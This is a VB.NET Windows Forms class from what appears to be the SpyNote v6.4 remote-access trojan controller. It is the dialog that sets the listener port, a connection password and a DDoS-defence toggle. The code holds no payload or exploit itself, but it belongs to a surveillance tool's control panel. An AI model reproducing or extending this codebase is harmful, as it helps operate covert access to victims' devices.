Imports Microsoft.VisualBasic.CompilerServices
Imports SpyNote_V6._4.SN.SpyNote.Stores

Public Class SelectPort
    Private NothingBitmap As Bitmap
    Public Sub New()
        Me.NothingBitmap = New Bitmap(1, 1)
        Me.InitializeComponent()
    End Sub

    Private Sub BtnExit_Click(ByVal sender As Object, ByVal e As EventArgs) Handles BtnExit.Click
        MyBase.DialogResult = System.Windows.Forms.DialogResult.Cancel
    End Sub

    Private Sub BtnOK_Click(ByVal sender As Object, ByVal e As EventArgs) Handles BtnOK.Click
        Me.EBtnOK()
    End Sub
    Private Sub EBtnOK()
        Me.PView.EndEdit()
        Dim portValue As Object = Me.PView.Rows(0).Cells(2).Value
        Dim str As String = If(portValue Is Nothing, String.Empty, Conversions.ToString(portValue).Trim())
        If (Not Versioned.IsNumeric(str)) Then
            MyBase.DialogResult = System.Windows.Forms.DialogResult.Cancel
        ElseIf (Conversions.ToInteger(str) <= 65535) Then
            My.Forms.MainSpyNote.SpyXml.Edit("value", 0, str)
            My.Forms.MainSpyNote.SpyXml.Edit("value", 1, If(Operators.ConditionalCompareObjectEqual(Me.PView.Rows(1).Cells(3).Tag, "False", False), Conversions.ToString(False), Conversions.ToString(True)))
            My.Forms.MainSpyNote.SpyXml.Edit("value", 2, If(Operators.ConditionalCompareObjectEqual(Me.PView.Rows(2).Cells(3).Tag, "False", False), Conversions.ToString(False), Conversions.ToString(True)))
            My.Forms.MainSpyNote.SpyXml.Edit("value", 3, Conversions.ToString(Me.PView.Rows(1).Cells(2).Value))
            MyBase.DialogResult = System.Windows.Forms.DialogResult.OK
        Else
            Interaction.MsgBox("Fail", MsgBoxStyle.Exclamation, "SpyNote")
        End If
    End Sub
    Private Sub PView_CellClick(ByVal sender As Object, ByVal e As DataGridViewCellEventArgs) Handles PView.CellClick
        Dim columnIndex As Integer = e.ColumnIndex
        Dim rowIndex As Integer = e.RowIndex
        If (columnIndex <> -1) Then
            If (columnIndex = 3) Then
                If (rowIndex <> -1 And rowIndex <> 0) Then
                    If (Not Operators.ConditionalCompareObjectEqual(Me.PView.Rows(rowIndex).Cells(columnIndex).Tag, "False", False)) Then
                        Me.PView.Rows(rowIndex).Cells(columnIndex).Value = Me.NothingBitmap
                        Me.PView.Rows(rowIndex).Cells(columnIndex).Tag = "False"
                    Else
                        Me.PView.Rows(rowIndex).Cells(columnIndex).Value = Store.Bitmap_0("ToolStrip\Check")
                        Me.PView.Rows(rowIndex).Cells(columnIndex).Tag = "True"
                    End If
                End If
            End If
        End If
    End Sub
    Private Sub PView_KeyDown(ByVal sender As Object, ByVal e As KeyEventArgs) Handles PView.KeyDown
        If (e.KeyCode = Keys.[Return]) Then
            Me.EBtnOK()
        End If
    End Sub

    Private Function ReadSetting(index As Integer, defaultValue As String) As String
        If My.Forms.MainSpyNote Is Nothing OrElse My.Forms.MainSpyNote.SpyXml Is Nothing Then
            Return defaultValue
        End If

        Dim value As String = My.Forms.MainSpyNote.SpyXml.Reading("value", index)
        If String.IsNullOrEmpty(value) Then
            Return defaultValue
        End If

        Return value.Trim()
    End Function

    Private Sub SelectPort_Load(ByVal sender As Object, ByVal e As EventArgs) Handles Me.Load
        MyBase.Icon = Store.WindowIcon(0)
        Me.PView.Rows.Add(New Object() {Me.NothingBitmap, "Port", Me.ReadSetting(0, "3210"), Me.NothingBitmap})
        Me.PView.Rows(Me.PView.Rows.Count - 1).Cells(3).Style.BackColor = Me.PView.BackgroundColor
        Me.PView.Rows(Me.PView.Rows.Count - 1).Cells(3).Style.SelectionBackColor = Me.PView.BackgroundColor
        Dim rows As DataGridViewRowCollection = Me.PView.Rows
        Dim passwordEnabled As Boolean = Conversions.ToBoolean(Me.ReadSetting(1, "False"))
        Dim passwordValue As String = Me.ReadSetting(3, "0123456789")
        Dim nothingBitmap() As Object = {Me.NothingBitmap, "Password", passwordValue, Nothing}
        nothingBitmap(3) = If(passwordEnabled, Store.Bitmap_0("ToolStrip\Check"), Me.NothingBitmap)
        rows.Add(nothingBitmap)
        Me.PView.Rows(Me.PView.Rows.Count - 1).Cells(3).Tag = Me.ReadSetting(1, "False")
        Me.PView.Rows(Me.PView.Rows.Count - 1).Cells(2).Value = passwordValue
        Me.PView.Rows(Me.PView.Rows.Count - 1).Cells(3).Style.BackColor = Me.PView.BackgroundColor
        Me.PView.Rows(Me.PView.Rows.Count - 1).Cells(3).Style.SelectionBackColor = Me.PView.BackgroundColor
        Dim dataGridViewRowCollections As DataGridViewRowCollection = Me.PView.Rows
        Dim objArray() As Object = {Me.NothingBitmap, "Defend Against DDOS Attack", "", Nothing}
        objArray(3) = If(Conversions.ToBoolean(Me.ReadSetting(2, "False")), Store.Bitmap_0("ToolStrip\Check"), Me.NothingBitmap)
        dataGridViewRowCollections.Add(objArray)
        Me.PView.Rows(Me.PView.Rows.Count - 1).Cells(3).Tag = Me.ReadSetting(2, "False")
        Me.PView.Rows(Me.PView.Rows.Count - 1).Cells(3).Style.BackColor = Me.PView.BackgroundColor
        Me.PView.Rows(Me.PView.Rows.Count - 1).Cells(3).Style.SelectionBackColor = Me.PView.BackgroundColor
        Me.PView.Rows(2).Cells(2).[ReadOnly] = True
        Dim count As Integer = Me.PView.Rows.Count - 1
        Dim circle As Integer = 0
        Do
            Me.PView.Rows(circle).Cells(0).Value = Store.CircleBitmap()
            circle = circle + 1
        Loop While circle <= count
        Me.Trans.Enabled = True
    End Sub

    Private Sub Trans_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles Trans.Tick
        If (MyBase.Opacity = 1) Then
            Me.Trans.Enabled = False
        Else
            MyBase.Opacity = MyBase.Opacity + 0.1
        End If
    End Sub
End Class